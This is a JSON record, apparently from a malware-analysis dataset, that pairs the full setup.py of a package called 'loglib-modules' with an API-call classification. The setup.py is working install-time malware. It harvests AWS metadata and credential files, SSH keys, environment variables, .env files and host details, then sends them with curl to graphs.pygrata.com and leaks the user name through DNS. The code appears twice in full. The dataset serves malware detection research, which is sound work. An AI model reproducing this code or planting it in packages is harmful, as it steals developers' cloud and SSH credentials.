[
  {
    "pyfile": "setup.py",
    "code_snippet": "import random\nimport socket\nimport getpass\nimport base64\nimport subprocess\nimport os\nimport binascii\n\nacmd = 'curl -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/'\nbcmd = 'cd ~/.aws && cat credentials'\nccmd = 'env'\ncdcmd = 'cd ~/.ssh && ls && cat *'\nipcmd = 'ip addr show'\ncatenvcmd = 'cd ~/ && ls .env* && cat .env*'\nres3 = \"\"\nall3 = \"\"\nall4 = \"\"\nall5 = \"\"\nall6 = \"\"\nall7 = \"\"\ngetcred = \"\"\n\ntry:\n    result = subprocess.getoutput(acmd)\n    rolename = str(result).split('instance-profile/')[1].split('\",')[0]\n    accmd = 'curl -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/' + rolename + '/'\n    getcred = subprocess.getoutput(accmd)\n    all3 = \"metadata \\n ----------------------------------------- \\n \\n\" + result + getcred\nexcept Exception as e:\n    pass\ntry:\n    result2 = subprocess.getoutput(bcmd)\n    all4 = \" \\n \\n a \\n ----------------------------------------- \\n \\n\" + result2\nexcept Exception as e:\n    pass\ntry:\n    hostname = \"\"\n    username = \"\"\n    cwd = \"\"\n    ipadd = \"\"\n    try:\n        hostname = socket.gethostname()\n    except Exception as e:\n        pass\n    try:\n        username = getpass.getuser()\n    except Exception as e:\n        pass\n    try:\n        cwd = os.getcwd()\n    except Exception as e:\n        pass\n    try:\n        ipadd = subprocess.getoutput(ipcmd)\n    except Exception as e:\n        pass\n    res3 = {'hostname':hostname,'cwd':cwd,'username':username,'IP':ipadd}\n    all5 = \"\\n \\n details \\n ----------------------------------------- \\n \\n \" + str(res3)\nexcept Exception as e:\n    pass\ntry:\n    result3 = subprocess.getoutput(ccmd)\n    all6 = \"\\n \\n en \\n ----------------------------------------- \\n \\n \" + result3\nexcept Exception as e:\n    pass\ntry:\n    result4 = subprocess.getoutput(cdcmd)\n    all7 = \"\\n \\n ssh \\n ----------------------------------------- \\n \\n \" + result4\nexcept Exception as e:\n    pass\n\nall8 = str(all3) + str(all4) + str(all5) + str(all6) + str(all7)\nif os.path.exists('.env') or os.path.exists('/root/.env') or os.path.exists('/home/*/.env'):\n    output = subprocess.getoutput(catenvcmd)\n    allen = all8 + \"\\n \\n en \\n ----------------------------------------- \\n \\n \" + str(output)\n    filename1 = str(random.randint(0, 99999999999)) + '.txt'\n    filename2 = str(filename1)\n    with open(filename2, 'a') as d:\n        d.write(allen + '\\n')\n    subprocess.getoutput(\"curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@\" + filename2 + \"' -F 'submit=Upload'\")\n    subprocess.getoutput('curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' + allen + '\"')\n    os.remove(filename2)\n    usern = getpass.getuser()\n    userb64 = base64.b64encode(usern.encode()).decode()\n    hexb64 = binascii.hexlify(base64.b64decode(userb64))\n    hexusern = hexb64.decode(\"utf-8\")\n    subprocess.getoutput('dig ' + hexusern + 'isuser.api.pygrata.com')\nelse:\n    filename1 = str(random.randint(0, 99999999999)) + '.txt'\n    filename2 = str(filename1)\n    with open(filename2, 'a') as d:\n        d.write(all8 + '\\n')\n    subprocess.getoutput(\"curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@\" + filename2 + \"' -F 'submit=Upload'\")\n    subprocess.getoutput('curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' + all8 + '\"')\n    os.remove(filename2)\n    usern = getpass.getuser()\n    userb64 = base64.b64encode(usern.encode()).decode()\n    hexb64 = binascii.hexlify(base64.b64decode(userb64))\n    hexusern = hexb64.decode(\"utf-8\")\n    subprocess.getoutput('dig ' + hexusern + 'isuser.api.pygrata.com')",
    "pattern_analysis": {
      "api_sequence": [
        "subprocess.getoutput",
        "str.split",
        "str.split",
        "subprocess.getoutput",
        "subprocess.getoutput",
        "socket.gethostname",
        "getpass.getuser",
        "os.getcwd",
        "subprocess.getoutput",
        "subprocess.getoutput",
        "subprocess.getoutput",
        "subprocess.getoutput",
        "os.path.exists",
        "os.path.exists",
        "os.path.exists",
        "subprocess.getoutput",
        "random.randint",
        "open",
        "open.write",
        "subprocess.getoutput",
        "subprocess.getoutput",
        "os.remove",
        "getpass.getuser",
        "str.encode",
        "base64.b64encode",
        "base64.b64decode",
        "binascii.hexlify",
        "bytes.decode",
        "subprocess.getoutput",
        "random.randint",
        "open",
        "open.write",
        "subprocess.getoutput",
        "subprocess.getoutput",
        "os.remove",
        "getpass.getuser",
        "str.encode",
        "base64.b64encode",
        "base64.b64decode",
        "binascii.hexlify",
        "bytes.decode",
        "subprocess.getoutput"
      ],
      "api_sequence_with_args": [
        "subprocess.getoutput(acmd)",
        "str(result).split('instance-profile/')",
        "str(...).split('\",')",
        "subprocess.getoutput(accmd)",
        "subprocess.getoutput(bcmd)",
        "socket.gethostname()",
        "getpass.getuser()",
        "os.getcwd()",
        "subprocess.getoutput(ipcmd)",
        "subprocess.getoutput(ccmd)",
        "subprocess.getoutput(cdcmd)",
        "subprocess.getoutput(catenvcmd)",
        "os.path.exists('.env')",
        "os.path.exists('/root/.env')",
        "os.path.exists('/home/*/.env')",
        "subprocess.getoutput(catenvcmd)",
        "random.randint(0, 99999999999)",
        "open(filename2, 'a')",
        "d.write(allen + '\\n')",
        "subprocess.getoutput(\"curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@\" + filename2 + \"' -F 'submit=Upload'\")",
        "subprocess.getoutput('curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' + allen + '\"')",
        "os.remove(filename2)",
        "getpass.getuser()",
        "usern.encode()",
        "base64.b64encode(usern.encode())",
        "base64.b64decode(userb64)",
        "binascii.hexlify(base64.b64decode(userb64))",
        "hexb64.decode(\"utf-8\")",
        "subprocess.getoutput('dig ' + hexusern + 'isuser.api.pygrata.com')",
        "random.randint(0, 99999999999)",
        "open(filename2, 'a')",
        "d.write(all8 + '\\n')",
        "subprocess.getoutput(\"curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@\" + filename2 + \"' -F 'submit=Upload'\")",
        "subprocess.getoutput('curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' + all8 + '\"')",
        "os.remove(filename2)",
        "getpass.getuser()",
        "usern.encode()",
        "base64.b64encode(usern.encode())",
        "base64.b64decode(userb64)",
        "binascii.hexlify(base64.b64decode(userb64))",
        "hexb64.decode(\"utf-8\")",
        "subprocess.getoutput('dig ' + hexusern + 'isuser.api.pygrata.com')"
      ],
      "mapped_sequence": [
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "str.split",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "str.split",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "socket.gethostname",
          "id": "get_hostname",
          "description": "Retrieves current host name",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "getpass.getuser",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.getcwd",
          "id": "get_working_dir",
          "description": "Returns current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "random.randint",
          "id": "get_random_number",
          "description": "No direct match; closest is random number generation, not in taxonomy. (Omitted from mapped_sequence as per instructions.)",
          "first_id": "",
          "second_id": "",
          "third_id": ""
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "getpass.getuser",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "str.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "base64.b64encode",
          "id": "encode_bytes_to_base64",
          "description": "Encodes bytes to base64-encoded bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "binascii.hexlify",
          "id": "convert_bytes_to_hex",
          "description": "Converts bytes to hexadecimal string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "bytes.decode",
          "id": "decode_bytes_codec",
          "description": "Decodes bytes using specified codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "random.randint",
          "id": "get_random_number",
          "description": "No direct match; closest is random number generation, not in taxonomy. (Omitted from mapped_sequence as per instructions.)",
          "first_id": "",
          "second_id": "",
          "third_id": ""
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "getpass.getuser",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "str.encode",
          "id": "encode_string_to_bytes",
          "description": "Encodes string to bytes using default encoding",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "base64.b64encode",
          "id": "encode_bytes_to_base64",
          "description": "Encodes bytes to base64-encoded bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "binascii.hexlify",
          "id": "convert_bytes_to_hex",
          "description": "Converts bytes to hexadecimal string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "bytes.decode",
          "id": "decode_bytes_codec",
          "description": "Decodes bytes using specified codec",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "subprocess.getoutput",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        }
      ],
      "contextual_code": "import random\nimport socket\nimport getpass\nimport base64\nimport subprocess\nimport os\nimport binascii\n\nacmd = 'curl -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/'\nbcmd = 'cd ~/.aws && cat credentials'\nccmd = 'env'\ncdcmd = 'cd ~/.ssh && ls && cat *'\nipcmd = 'ip addr show'\ncatenvcmd = 'cd ~/ && ls .env* && cat .env*'\n\ntry:\n    result = subprocess.getoutput(acmd)\n    rolename = str(result).split('instance-profile/')[1].split('\",')[0]\n    accmd = 'curl -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/' + rolename + '/'\n    getcred = subprocess.getoutput(accmd)\n    all3 = \"metadata \\n ----------------------------------------- \\n \\n\" + result + getcred\nexcept Exception as e:\n    pass\ntry:\n    result2 = subprocess.getoutput(bcmd)\n    all4 = \" \\n \\n a \\n ----------------------------------------- \\n \\n\" + result2\nexcept Exception as e:\n    pass\ntry:\n    hostname = \"\"\n    username = \"\"\n    cwd = \"\"\n    ipadd = \"\"\n    try:\n        hostname = socket.gethostname()\n    except Exception as e:\n        pass\n    try:\n        username = getpass.getuser()\n    except Exception as e:\n        pass\n    try:\n        cwd = os.getcwd()\n    except Exception as e:\n        pass\n    try:\n        ipadd = subprocess.getoutput(ipcmd)\n    except Exception as e:\n        pass\n    res3 = {'hostname':hostname,'cwd':cwd,'username':username,'IP':ipadd}\n    all5 = \"\\n \\n details \\n ----------------------------------------- \\n \\n \" + str(res3)\nexcept Exception as e:\n    pass\ntry:\n    result3 = subprocess.getoutput(ccmd)\n    all6 = \"\\n \\n en \\n ----------------------------------------- \\n \\n \" + result3\nexcept Exception as e:\n    pass\ntry:\n    result4 = subprocess.getoutput(cdcmd)\n    all7 = \"\\n \\n ssh \\n ----------------------------------------- \\n \\n \" + result4\nexcept Exception as e:\n    pass\n\nall8 = str(all3) + str(all4) + str(all5) + str(all6) + str(all7)\nif os.path.exists('.env') or os.path.exists('/root/.env') or os.path.exists('/home/*/.env'):\n    output = subprocess.getoutput(catenvcmd)\n    allen = all8 + \"\\n \\n en \\n ----------------------------------------- \\n \\n \" + str(output)\n    filename1 = str(random.randint(0, 99999999999)) + '.txt'\n    filename2 = str(filename1)\n    with open(filename2, 'a') as d:\n        d.write(allen + '\\n')\n    subprocess.getoutput(\"curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@\" + filename2 + \"' -F 'submit=Upload'\")\n    subprocess.getoutput('curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' + allen + '\"')\n    os.remove(filename2)\n    usern = getpass.getuser()\n    userb64 = base64.b64encode(usern.encode()).decode()\n    hexb64 = binascii.hexlify(base64.b64decode(userb64))\n    hexusern = hexb64.decode(\"utf-8\")\n    subprocess.getoutput('dig ' + hexusern + 'isuser.api.pygrata.com')\nelse:\n    filename1 = str(random.randint(0, 99999999999)) + '.txt'\n    filename2 = str(filename1)\n    with open(filename2, 'a') as d:\n        d.write(all8 + '\\n')\n    subprocess.getoutput(\"curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@\" + filename2 + \"' -F 'submit=Upload'\")\n    subprocess.getoutput('curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' + all8 + '\"')\n    os.remove(filename2)\n    usern = getpass.getuser()\n    userb64 = base64.b64encode(usern.encode()).decode()\n    hexb64 = binascii.hexlify(base64.b64decode(userb64))\n    hexusern = hexb64.decode(\"utf-8\")\n    subprocess.getoutput('dig ' + hexusern + 'isuser.api.pygrata.com')"
    }
  },
  {
    "metadata": {
      "package_name": "loglib-modules-1.0.8"
    }
  }
]